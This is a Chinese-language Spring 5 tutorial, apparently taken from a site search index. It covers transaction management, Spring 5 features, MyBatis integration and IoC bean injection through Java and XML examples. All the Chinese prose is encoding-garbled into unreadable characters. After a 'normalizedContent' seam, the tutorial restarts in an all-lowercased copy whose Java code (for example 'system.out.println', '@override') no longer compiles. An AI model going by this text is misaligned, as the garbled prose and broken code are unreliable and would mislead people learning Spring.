ï¼é»è¾ä¸ä¸ç»æä½ï¼è¦ä¹é½æåï¼å¦ææä¸ä¸ªå¤±è´¥æææä½é½å¤±è´¥ãå¸åçä¸å¡åºæ¯å°±æ¯è½¬è´¦ï¼lucy è½¬è´¦ 100 å ç» maryï¼lucy å° 100ï¼mary å¤ 100\n\näºå¡æåä¸ªç¹æ§ï¼\n\n * åå­æ§\n * ä¸è´æ§\n * éç¦»æ§\n * æä¹æ§\n\n\n# æµè¯ä»£ç \n\næ¨¡æä¸è¿°çè½¬è´¦çä¾å­\n\n 1. åå»ºDao\n\npackage com.pwddd.dao.impl;\n\nimport com.pwddd.dao.UserDao;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.jdbc.core.JdbcTemplate;\nimport org.springframework.stereotype.Repository;\n\n@Repository\npublic class UserDaoImpl implements UserDao {\n    @Autowired\n    private JdbcTemplate jdbcTemplate;\n\n    @Override\n    public void reduceMoney() {\n        String sql = "update bank set money=money-100 where id=1";\n        jdbcTemplate.update(sql);\n    }\n\n    @Override\n    public void addMoney() {\n        String sql = "update bank set money=money+100 where id=2";\n        jdbcTemplate.update(sql);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n 2. åå»ºService\n\npackage com.pwddd.service.impl;\n\nimport com.pwddd.dao.UserDao;\nimport com.pwddd.service.UserService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\n\n@Service\npublic class UserServiceImpl implements UserService {\n    @Autowired\n    private UserDao userDao;\n\n    @Override\n    public void accountMoney() {\n        userDao.reduceMoney();\n\n        int i = 1/0;\n        userDao.addMoney();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nå¦ææ²¡æäºå¡ï¼åå½å°é±ä¹åæ¥éï¼æ²¡æå¤é±ï¼å°±ä¼å¯¼è´ä¸ä¸è´çæåµã\n\n\n# äºå¡çæä½è¿ç¨\n\näºå¡æ·»å å° JavaEE ä¸å±ç»æéé¢ Service å±ï¼ä¸å¡é»è¾å±ï¼ å¨ Spring è¿è¡äºå¡ç®¡çæä½æä¸¤ç§æ¹å¼ï¼\n\n * ç¼ç¨å¼äºå¡ç®¡ç\n * å£°æå¼äºå¡ç®¡çï¼ä½¿ç¨ï¼\n\nç¼ç¨å¼äºå¡ç®¡çå¦å¾ï¼\n\n\n\nå£°æå¼äºå¡ç®¡çæä¸¤ç§å®ç°æ¹å¼ï¼\n\n * åºäºæ³¨è§£çå®ç°\n * åºäºXMLçå®ç°\n\nå¨ Spring è¿è¡å£°æå¼äºå¡ç®¡çï¼åºå±ä½¿ç¨ AOP åçï¼Spring äºå¡ç®¡ç API æä¾ä¸ä¸ªæ¥å£ï¼ä»£è¡¨äºå¡ç®¡çå¨ï¼è¿ä¸ªæ¥å£éå¯¹ä¸åçæ¡æ¶æä¾ä¸åçå®ç°ç±»ã\n\n\n\n\n# åºäºæ³¨è§£æ¹å¼çäºå¡ç®¡ç\n\nå®å¨æ³¨è§£å¼åçæ¹å¼è¿è¡äºå¡ç®¡çï¼\n\npackage com.pwddd.config;\n\nimport com.alibaba.druid.pool.DruidDataSource;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.ComponentScan;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.jdbc.core.JdbcTemplate;\nimport org.springframework.jdbc.datasource.DataSourceTransactionManager;\nimport org.springframework.transaction.TransactionManager;\nimport org.springframework.transaction.annotation.EnableTransactionManagement;\n\nimport javax.sql.DataSource;\n\n@Configuration\n@ComponentScan(basePackages = "com.pwddd")\n@EnableTransactionManagement  // å¼å¯äºå¡\npublic class SpringConfig {\n\n    @Bean\n    public DruidDataSource getDataSource(){\n        DruidDataSource druidDataSource = new DruidDataSource();\n        druidDataSource.setUrl("jdbc:mysql://localhost:3306/srping5test");\n        druidDataSource.setDriverClassName("com.mysql.jdbc.Driver");\n        druidDataSource.setUsername("root");\n        druidDataSource.setPassword("123456");\n        return druidDataSource;\n    }\n\n    @Bean\n    public JdbcTemplate getJdbcTemplete(DruidDataSource dataSource){\n        JdbcTemplate jdbcTemplate = new JdbcTemplate();\n        jdbcTemplate.setDataSource(dataSource);\n        return jdbcTemplate;\n    }\n\n    @Bean\n    public TransactionManager getTransactionManager(DataSource dataSource){\n        DataSourceTransactionManager dataSourceTransactionManager = new DataSourceTransactionManager();\n        dataSourceTransactionManager.setDataSource(dataSource);\n        return dataSourceTransactionManager;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\nå¨æ³è¦è¿è¡äºå¡çç±»æèæ¹æ³ä¸æ·»å æ³¨è§£\n\npackage com.pwddd.service.impl;\n\nimport com.pwddd.dao.UserDao;\nimport com.pwddd.service.UserService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\n@Service\n@Transactional(propagation = Propagation.REQUIRED,isolation = Isolation.REPEATABLE_READ)\npublic class UserServiceImpl implements UserService {\n    @Autowired\n    private UserDao userDao;\n\n    @Override\n    public void accountMoney() {\n        userDao.reduceMoney();\n\n        int i = 1/0;\n        userDao.addMoney();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n# æ³¨è§£ç¸å³åæ°è§£é\n\nå¨ service ç±»ä¸é¢æ·»å æ³¨è§£@Transactionalï¼å¨è¿ä¸ªæ³¨è§£éé¢å¯ä»¥éç½®äºå¡ç¸å³åæ°ã\n\n\n\n# propagationï¼äºå¡ä¼ æ­è¡ä¸º\n\n\n\n\n\n# ioslationï¼äºå¡éç¦»çº§å«\n\näºå¡æç¹æ§æä¸ºéç¦»æ§ï¼å¤äºå¡æä½ä¹é´ä¸ä¼äº§çå½±åãä¸èèéç¦»æ§äº§çå¾å¤é®é¢ãå¨éç¦»æ§ä¸­å¸¸è§çä¸ä¸ªé®é¢æ¯ï¼èè¯»ãä¸å¯éå¤è¯»ãèï¼å¹»ï¼è¯»ã\n\n 1. èè¯»ï¼ä¸ä¸ªæªæäº¤äºå¡è¯»åå°å¦ä¸ä¸ªæªæäº¤äºå¡çæ°æ®\n\n\n\n 2. ä¸å¯éå¤è¯»ï¼ä¸ä¸ªæªæäº¤äºå¡è¯»åå°å¦ä¸æäº¤äºå¡ä¿®æ¹æ°æ®\n\n\n\n 3. èè¯»ï¼ä¸ä¸ªæªæäº¤äºå¡è¯»åå°å¦ä¸æäº¤äºå¡æ·»å æ°æ®\n\nè§£å³ä»¥ä¸é®é¢ï¼å¯ä»¥éç½®æ³¨è§£çç¸å³åæ°ã\n\n\n\n# timeoutï¼è¶æ¶æ¶é´\n\näºå¡éè¦å¨ä¸å®æ¶é´åè¿è¡æäº¤ï¼å¦æä¸æäº¤è¿è¡åæ»ãé»è®¤å¼æ¯ -1 ï¼è®¾ç½®æ¶é´ä»¥ç§åä½è¿è¡è®¡ç®ã\n\n# readOnlyï¼æ¯å¦åªè¯»\n\nè¯»ï¼æ¥è¯¢æä½ï¼åï¼æ·»å ä¿®æ¹å é¤æä½ï¼readOnly é»è®¤å¼ falseï¼è¡¨ç¤ºå¯ä»¥æ¥è¯¢ï¼å¯ä»¥æ·»å ä¿®æ¹å é¤æä½ãè®¾ç½® readOnly å¼æ¯ trueï¼è®¾ç½®æ true ä¹åï¼åªè½æ¥è¯¢ã\n\n# rollbackForï¼åæ»\n\nè®¾ç½®åºç°åªäºå¼å¸¸è¿è¡äºå¡åæ»\n\n# noRollbackForï¼ä¸åæ»\n\nè®¾ç½®åºç°åªäºå¼å¸¸ä¸è¿è¡äºå¡åæ»\n\n\n# åºäºXMLéç½®äºå¡\n\nç¤ºä¾ä»£ç ï¼\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xmlns:tx="http://www.springframework.org/schema/tx"\n       xmlns:aop="http://www.springframework.org/schema/aop"\n       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n                http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\n                http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd\n                http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd">\n    <context:component-scan base-package="com.pwddd" />\n    <context:property-placeholder location="classpath:jdbc.properties" />\n    <bean id="datasource" class="com.alibaba.druid.pool.DruidDataSource">\n        <property name="driverClassName" value="${jdbc.driver}" />\n        <property name="password" value="${jdbc.password}" />\n        <property name="username" value="${jdbc.username}" />\n        <property name="url" value="${jdbc.url}" />\n    </bean>\n    <bean id="transcationManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager">\n        <property name="dataSource" ref="datasource" />\n    </bean>\n\n    <tx:advice id="txadvice">\n        <tx:attributes>\n            <tx:method name="accountMoney" propagation="REQUIRED"/>\n        </tx:attributes>\n    </tx:advice>\n\n    <aop:config>\n        <aop:pointcut id="pt" expression="execution(* com.pwddd.service.impl.UserServiceImpl.*(..))"/>\n        <aop:advisor advice-ref="txadvice" pointcut-ref="pt" />\n    </aop:config>\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# Spring5æ°ç¹æ§\n\n\n# æ¦è¿°\n\n> æ´ä¸ª Spring5 æ¡æ¶çä»£ç åºäº Java8ï¼è¿è¡æ¶å¼å®¹ JDK9ï¼è®¸å¤ä¸å»ºè®®ä½¿ç¨çç±»åæ¹ æ³å¨ä»£ç åºä¸­å é¤\n\n\n# æ´åæ¥å¿æ¡æ¶\n\nSpring 5.0 æ¡æ¶èªå¸¦äºéç¨çæ¥å¿å°è£ãå¹¶ä¸å·²ç»ç§»é¤ Log4jConfigListenerï¼å®æ¹å»ºè®®ä½¿ç¨ Log4j2ã\n\n 1. å¯¼å¥Jarå\n\n\n\n 2. åå»ºLog4j2.xmlæä»¶\n\n<?xml version="1.0" encoding="UTF-8"?>\n<Configuration status="DEBUG">\n    <Appenders>\n        <Console name="Console" target="SYSTEM_OUT">\n            <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>\n        </Console>\n    </Appenders>\n    <Loggers>\n        <Root level="error">\n            <AppenderRef ref="Console"/>\n        </Root>\n    </Loggers>\n</Configuration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# Nullableæ³¨è§£\n\n@Nullable æ³¨è§£å¯ä»¥ä½¿ç¨å¨æ¹æ³ä¸é¢ï¼å±æ§ä¸é¢ï¼åæ°ä¸é¢ãè¡¨ç¤ºæ¹æ³è¿åå¯ä»¥ä¸ºç©ºï¼å±æ§å¼å¯ä»¥ ä¸ºç©ºï¼åæ°å¼å¯ä»¥ä¸ºç©ºæ³¨è§£ã\n\n\n# æ ¸å¿å®¹å¨æ¯æå½æ°å¼é£æ ¼\n\nå®ä¾ä»£ç ï¼\n\n@Test\n    public void testGenericApplicationContext() {\n        //1 åå»º GenericApplicationContext å¯¹è±¡\n        GenericApplicationContext context = new GenericApplicationContext();\n        //2 è°ç¨ context çæ¹æ³å¯¹è±¡æ³¨å\n        context.refresh();\n        context.registerBean("user1",User.class,() -> new User());\n        //3 è·åå¨ spring æ³¨åçå¯¹è±¡\n        // User user = (User)context.getBean("com.atguigu.spring5.test.User");\n        User user = (User)context.getBean("user1");\n        System.out.println(user);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# æ¯ææ´åJunit5\n\n 1. å¼å¥spring testçä¾èµå\n\n 2. ç¼åJunit4æµè¯ç±»\n\npackage com.pwddd.spring5new.test;\n\nimport com.pwddd.spring5new.config.SpringConfig;\nimport com.pwddd.spring5new.service.UserService;\nimport org.junit.Test;\nimport org.junit.runner.RunWith;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.test.context.ContextConfiguration;\nimport org.springframework.test.context.junit4.SpringJUnit4ClassRunner;\n\n@RunWith(SpringJUnit4ClassRunner.class)\n@ContextConfiguration(classes = SpringConfig.class)\npublic class TestJunit {\n    @Autowired\n    private UserService userService;\n\n    @Test\n    public void testAdd(){\n        userService.add();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n 3. æ´åJunit5\n\npackage com.pwddd.spring5new.test;\n\nimport com.pwddd.spring5new.config.SpringConfig;\nimport com.pwddd.spring5new.service.UserService;\nimport org.junit.jupiter.api.Test;\nimport org.junit.jupiter.api.extension.ExtendWith;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.test.context.ContextConfiguration;\nimport org.springframework.test.context.junit.jupiter.SpringExtension;\n\n@ExtendWith(SpringExtension.class)\n@ContextConfiguration(classes = SpringConfig.class)\npublic class TestJunit5 {\n    @Autowired\n    private UserService userService;\n    @Test\n    public void test(){\n        userService.add();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n 4. ä½¿ç¨ä¸ä¸ªæ³¨è§£ä»£æ¿ä¸é¢çä¸¤ä¸ªæ³¨è§£\n\n//@ExtendWith(SpringExtension.class)\n//@ContextConfiguration(classes = SpringConfig.class)\n@SpringJUnitConfig(classes = SpringConfig.class)\n\n\n1\n2\n3\n\n\n\n# SpringWebflux\n\nåç½®ç¥è¯ï¼SpringMVCãJava8æ°ç¹æ§ãSpringBoot\n\n#TODO\n\n\n# Springæ´åMyBatis\n\nç®åæä»¬å¼ååè½çæµç¨ä¸­ï¼å¨serviceå±ä¼æå¨åå»ºSQLSessionå¯¹è±¡ï¼å¹¶ä½¿ç¨SQLSessionå¯¹è±¡è·åMapperæ¥å£çå®ä¾åå¯¹è±¡ï¼ä½æ¯æä»¬çæ­£ä½¿ç¨çæ¯Mapperæ¥å£çå¯¹è±¡ï¼ç®åçä»£ç ç¼åæ¹å¼æå¤§çå½±åäºå¼åæçï¼èä¸mybatiså±åserviceå±ä¹é´çè¦åæ§éå¸¸é«ã ä½¿ç¨SpringIOCææ¯å®ç°serviceå±åmybatiså±çè§£è¦ï¼è®©Springå®¹å¨å¸®æä»¬è·åMapperå±æ¥å£çå®ä¾å å¯¹è±¡ï¼æä»¬ç´æ¥ä»Springå®¹å¨ä¸­è·åä½¿ç¨å³å¯ã å¨ä¸å¡å±ä½¿ç¨Springå®¹å¨å¯¹è±¡è·åMapperæ¥å£å®ä¾åå¯¹è±¡åï¼å®ç°äºserviceå±åmybatiså±çè§£è¦ï¼ä½æ¯å¨controllerå±æä»¬ä¾ç¶å¨Servletä¸­ç´æ¥åå»ºServiceå¯¹è±¡ï¼è¦åæ§è¿é«ã å°serviceå¯¹è±¡éç½®ä¸ºbeanå¯¹è±¡ï¼Servletä¸­ä»Springå®¹å¨ä¸­ï¼è·åServiceå¯¹è±¡ï¼å®æåè½å¼åãåæ¶ä¼ ç»çè·åSpringå®¹å¨çæ¹æ³åå¨æ¯ä¸ªServletçserviceæ¹æ³ä¸­ï¼åè®¾æ¯ä¸ªè¯·æ±è°ç¨serviceé½è¦åå»ºä¸ä¸ªservletï¼é£ä¹å°±ä¼é æå®¹å¨çèµæºæµªè´¹ã\n\nåå«éç½®æ°æ®æºï¼sqlSessionFactoryï¼æ«æMapper\n\n<bean class="org.springframework.jdbc.datasource.DriverManagerDataSource" id="dataSource">\n<property name="url" value="jdbc:mysql://localhost:3306/test?characterEncoding=utf8&useSSL=false&serverTimezone=Asia/Shanghai"/>\n<property name="driverClassName" value="com.mysql.jdbc.Driver" />\n<property name="username" value="root" />\n<property name="password" value="123456" />\n</bean>\n\n\x3c!--    éç½®sqlSessionFactory--\x3e\n<bean class="org.mybatis.spring.SqlSessionFactoryBean" id="factory">\n<property name="dataSource" ref="dataSource" />\n</bean>\n\n\x3c!--    éç½®æ«æmapper--\x3e\n<bean class="org.mybatis.spring.mapper.MapperScannerConfigurer" id="mapperScanner">\n<property name="sqlSessionFactory"  ref="factory"/>\n<property name="basePackage" value="pers.jm.mapper"/>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\néç½®serviceå±Bean serviceå±éè¦è°ç¨mapperå±çæ¹æ³ï¼å æ­¤å¨serviceä¸­éè¦mapperå±çå¯¹è±¡ãå¨serviceå±ä¸­å£°æmapperå±çå¼ç¨ï¼å¹¶ä¸ºä¹åå»ºgetsetæ¹æ³ã\n\nUserMapper userMapper;\n\n  public UserMapper getUserMapper() {\n      return userMapper;\n  }\n\n  public void setUserMapper(UserMapper userMapper) {\n      this.userMapper = userMapper;\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nä¹åéç½®serviceå±çbean,æ·»å èªå¨æ«æmapperç±»çå¯¹è±¡å¼ç¨\n\n<bean class="pers.jm.service.UserServiceImpl" id="userService">\n    <property name="userMapper" ref="userMapper" />\n</bean>\n\n\n1\n2\n3\n\n\nå¨web.xmlå è½½springçéç½®æä»¶å¹¶è®¾ç½®çå¬å¨\n\n<context-param>\n    <param-name>contextConfigLocation</param-name>\x3c!--é®å--\x3e\n    <param-value>classpath:applicationContext.xml</param-value>\x3c!--å¼--\x3e\n  </context-param>\n  <listener>\n    <listener-class>\n      org.springframework.web.context.ContextLoaderListener\n    </listener-class>\n  </listener>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå¨servletçinitæ¹æ³ä¸­ï¼è·åå¯¹è±¡\n\nUserService userService;\n@Override\npublic void init() throws ServletException {\n    WebApplicationContext webApplicationContext = WebApplicationContextUtils.getWebApplicationContext(this.getServletContext());\n    userService = (UserService) webApplicationContext.getBean("userService");\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\nè³æ­¤ï¼servlet â service â mapper ä¾èµéç½®å®æ\n\nå½æå¡å¨å¯å¨æ¶ï¼éè¿web.xmlä¸­éç½®ççå¬å¨ï¼å è½½springçéç½®æä»¶ï¼springéç½®æä»¶å è½½åï¼è®¾ç½®mybatisçæ°æ®æºï¼sqlsessionç­å¹¶æ«æåå»ºå¯¹åºçmapperå¯¹è±¡ãmapperå¯¹è±¡åå»ºåï¼æ ¹æ®éç½®åå»ºserviceçå¯¹è±¡ï¼serviceå¯¹è±¡ä¸­æ³¨å¥mapperå±çå¯¹è±¡å¼ç¨ãå æ­¤servletè·åserviceå¯¹è±¡ï¼å®éä¸è·åçæ¯ æmapperå¼ç¨çserviceå±å¯¹è±¡ã',normalizedContent:'# spring5\n\n\n# springç®ä»\n\n\n# æ¦è¿°\n\nspringæ¯ä¸ä¸ªæ§å¶åè½¬(springioc)åé¢ååé¢ç(springaop)çè½»éçº§æ¡æ¶ãspringæ¯ä¸ä¸ªæ¡æ¶é,åé¨éæäºå¾å¤çåè½,å¯ä»¥æ ¹æ®éæ±éæ©å¯¹åºçå­æ¡æ¶ä½¿ç¨ã\n\nä½ç¨ï¼\n\n * ç®åä¼ä¸é¡¹ç®çå¼åçæµç¨ï¼æåå¼åæç\n * ä¾¿äºä»£ç çåæç»´æ¤åçº§\n * å°ä»£ç ä¹é´çè¦åæ§éä½\n\nspring framework ç»æé¨å\n\n\n\næ ¸å¿æ¦å¿µï¼\n\n * springiocï¼æ§å¶åè½¬ï¼æåå»ºå¯¹è±¡è¿ç¨äº¤ç»springè¿è¡ç®¡ç\n * springaopï¼é¢ååé¢ï¼ä¸ä¿®æ¹æºä»£ç è¿è¡åè½å¢å¼º\n\n\n# springdemo\n\n> springç»ä»¶ä¸è½½å°åï¼jfrog (spring.io)\n\n 1. åå»ºé¡¹ç®ï¼å¯¼å¥åºç¡jarå\n    \n    \n\n 2. åå»ºæµè¯ç±»\n\n\tpackage com.pwddd.spring5; \n\tpublic class user { \n\t\tpublic void add(){ \n\t\t\tsystem.out.println("add......."); \n\t\t} \n\t}\n\n\n1\n2\n3\n4\n5\n6\n\n 3. åå»ºéç½®æä»¶\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n       xmlns:p="http://www.springframework.org/schema/p"\n       xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">\n\n    <bean id="user" class="com.pwddd.spring5.user" />\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 4. ç¼åæµè¯ä»£ç \n\n@test\npublic void testadd(){\n    applicationcontext applicationcontext = new classpathxmlapplicationcontext("bean1.xml");\n    user user = applicationcontext.getbean("user", user.class);\n    system.out.println(user);\n    user.add();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# springioc\n\n\n# èæ¯\n\nå¨ä½¿ç¨mvcçç»æä½ç³»æ¥å®æåå°åè½ä»£ç çå£°ææ¶ï¼å¨ä¸å®ç¨åº¦ä¸éä½äºä»£ç çåä½ï¼ä½æ¯å±ä¸å±ä¹é´çè¦åæ§è¿é«ï¼é æä»£ç åçº§ç»´æ¤ç¹å«éº»ç¦ãæ¯å¦ï¼æå¤©ä¸å¡å±æä¸ªç±»æä»¶éè¦æ¿æ¢ä¸ºæ°çç±»æä»¶ï¼é£ä¹ï¼æ§å¶å±ææè°ç¨è¯¥ä¸å¡ç±»çä»£ç éè¦å¨é¨ä¿®æ¹ä¸ºè°ç¨æ°çä¸å¡ç±»ã è§£å³åæ³å°±æ¯å°å±ä¸å±å¯¹è±¡ä¹é´çå³ç³»è§£è¦ï¼ç±ç´æ¥å³ç³»åä¸ºé´æ¥å³ç³»ã\n\n\n# iocåºå±åç\n\n# ä»ä¹æ¯ioc\n\næ§å¶åè½¬ï¼æå¯¹è±¡åå»ºåå¯¹è±¡ä¹é´çè°ç¨è¿ç¨ï¼äº¤ç»springè¿è¡ç®¡ç ä½¿ç¨iocç®çï¼ä¸ºäºè¦ååº¦éä½\n\n# åçè®²è§£\n\n\n\n# beanfactoryæ¥å£\n\niocææ³åºäºiocå®¹å¨å®æï¼iocå®¹å¨åºå±å°±æ¯å¯¹è±¡å·¥åãspringæä¾iocå®¹å¨å®ç°ä¸¤ç§æ¹å¼ï¼ï¼ä¸¤ä¸ªæ¥å£ï¼\n\n * beanfactoryï¼iocå®¹å¨åºæ¬å®ç°ï¼æ¯springåé¨çä½¿ç¨æ¥å£ï¼ä¸æä¾å¼åäººåè¿è¡ä½¿ç¨\n   * å è½½éç½®æä»¶æ¶åä¸ä¼åå»ºå¯¹è±¡ï¼å¨è·åå¯¹è±¡ï¼ä½¿ç¨ï¼æå»åå»ºå¯¹è±¡\n * applicationcontextï¼beanfactoryæ¥å£çå­æ¥å£ï¼æä¾æ´å¤æ´å¼ºå¤§çåè½ï¼ä¸è¬ç±å¼åäººåè¿è¡ä½¿ç¨\n   * å è½½éç½®æä»¶æ¶åå°±ä¼æå¨éç½®æä»¶å¯¹è±¡è¿è¡åå»º\n\n\n# beanç®¡ç\n\nbeanç®¡çåå«ä¸¤ä¸ªæ¹é¢ï¼\n\n * springåå»ºå¯¹è±¡\n * springæ³¨å¥å±æ§\n\nbeanç®¡ççä¸¤ç§æ¹å¼ï¼\n\n * åºäºxmlè¿è¡éç½®\n * åºäºæ³¨è§£çæ¹å¼å®ç°\n\n# åºäºxmlè¿è¡éç½®\n\n# åå»ºå¯¹è±¡\n\nå¨springéç½®æä»¶ä¸­ï¼ä½¿ç¨beanæ ç­¾ï¼æ ç­¾éé¢æ·»å å¯¹åºå±æ§ï¼å°±å¯ä»¥å®ç°å¯¹è±¡åå»ºãåå»ºå¯¹è±¡æ¶ï¼é»è®¤æ§è¡æ åæ°æé æ¹æ³å®æå¯¹è±¡çåå»ºãå¨beanæ ç­¾æå¾å¤å±æ§ï¼å¸¸ç¨çå±æ§æä¸¤ä¸ªï¼\n\n * idå±æ§ï¼å¯ä¸æ è¯\n * classå±æ§ï¼ç±»å¨è·¯å¾ï¼åç±»è·¯å¾ï¼\n\nuser beanéç½®ï¼\n\n<bean id="user" class="com.pwddd.spring5.user" />\n\n\n1\n\n\n# æ³¨å¥å±æ§\n\næ³¨å¥å±æ§æä¸¤ç§æ¹å¼ï¼\n\n * ä½¿ç¨setæ¹æ³è¿è¡æ³¨å¥\n * ä½¿ç¨æé å¨è¿è¡æ³¨å¥\n * påç§°ç©ºé´æ³¨å¥ï¼å®éä¸æ¯setæ¹æ³æ³¨å¥ï¼\n\n# ä½¿ç¨setè¿è¡æ³¨å¥\n\n 1. åå»ºç±»ï¼ç¼åå¯¹åºå±æ§çsetæ¹æ³ã\n\npackage com.pwddd.spring5;\n\npublic class book {\n    public string name;\n    public string author;\n\n    public void setname(string name) {\n        this.name = name;\n    }\n\n    public void setauthor(string author) {\n        this.author = author;\n    }\n\n    @override\n    public string tostring() {\n        return "book{" +\n                "name=\'" + name + \'\\\'\' +\n                ", author=\'" + author + \'\\\'\' +\n                \'}\';\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n 2. ç¼åxmléç½®æä»¶ï¼ä½¿ç¨propertyè¿è¡æ³¨å¥\n\n<bean id="book" class="com.pwddd.spring5.book" >\n    <property name="name" value="çº¢æ¥¼"></property>\n    <property name="author" value="æ¹éªè¹"></property>\n</bean>\n\n\n1\n2\n3\n4\n\n\n# ä½¿ç¨å¸¦åæé è¿è¡æ³¨å¥\n\n 1. åå»ºç±»ï¼å¹¶çæå¸¦åæé å¨ã\n\npackage com.pwddd.spring5;\n\npublic class order {\n    public string id;\n    public string phone;\n\n    @override\n    public string tostring() {\n        return "order{" +\n                "id=\'" + id + \'\\\'\' +\n                ", phone=\'" + phone + \'\\\'\' +\n                \'}\';\n    }\n\n    public order(string id, string phone) {\n        this.id = id;\n        this.phone = phone;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n 2. ç¼åéç½®xmléç½®æä»¶ï¼ä½¿ç¨constructor-argè¿è¡æ³¨å¥ã\n\n<bean id="order" class="com.pwddd.spring5.order" >\n    <constructor-arg index="0" value="00001"></constructor-arg>\n    <constructor-arg index="1" value="ä¸æµ·"></constructor-arg>\n</bean>\n\n\n1\n2\n3\n4\n\n\n# påç§°ç©ºé´æ³¨å¥\n\n 1. æ·»å påç§°ç©ºé´xmlns\n\nxmlns:p="http://www.springframework.org/schema/p"\n\n\n1\n\n 2. ç¼åxmléç½®æä»¶\n\n\x3c!--    pæ³¨å¥éè¦æ·»å xmlnsï¼p\n        pæ³¨å¥éè¦setæ¹æ³\n--\x3e\n<bean id="book" class="com.pwddd.spring5.book" p:name="è¥¿æ¸¸è®°" p:author="hahah" />\n\n\n1\n2\n3\n4\n\n\n# ä¸åç±»åçå±æ§æ³¨å¥æ¹å¼\n\n# å­é¢énull\n\n<bean id="order" class="com.pwddd.spring5.order" >\n  <constructor-arg index="0">\n      <null></null>\n  </constructor-arg>\n  <constructor-arg index="1">\n      <null></null>\n  </constructor-arg>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# åå«ç¹æ®å­ç¬¦çå±æ§å¼\n\n<constructor-arg index="1">\n    <value><![cdata[<>hahah<>]]>&gt; &lt; </value>\n</constructor-arg>\n\n\n1\n2\n3\n\n\n# å¤é¨bean\n\nuserserviceä¸­éè¦ä¾èµuserdaoï¼å¯ä»¥ä½¿ç¨å¤é¨beançæ¹å¼å°userdaoæ³¨å¥å°userserviceä¸­ã\n\n 1. åå»ºuserservice\n\npackage com.pwddd.spring5.service.impl;\n\nimport com.pwddd.spring5.dao.userdao;\nimport com.pwddd.spring5.service.userservice;\n\npublic class userserviceimpl implements userservice {\n    private userdao userdao;\n\n    public void setuserdao(userdao userdao) {\n        this.userdao = userdao;\n    }\n\n    @override\n    public void adduser() {\n        system.out.println("service...adduser");\n        userdao.adduser();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n 2. åå»ºuserdao\n\npackage com.pwddd.spring5.dao.impl;\n\nimport com.pwddd.spring5.dao.userdao;\n\npublic class userdaoimpl implements userdao {\n    @override\n    public void adduser() {\n        system.out.println("dao......adduser");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n 3. ç¼åéç½®æä»¶ï¼ä½¿ç¨refæ³¨å¥å¤é¨bean\n\n<bean id="userservice" class="com.pwddd.spring5.service.impl.userserviceimpl">\n    <property name="userdao" ref="userdaoimpl"></property>\n</bean>\n\n<bean id="userdaoimpl" class="com.pwddd.spring5.dao.impl.userdaoimpl"></bean>\n\n\n1\n2\n3\n4\n5\n\n 4. ç¼åæµè¯ä»£ç \n\n@test\npublic void testuser(){\n\tuserservice userservice = context.getbean("userservice", 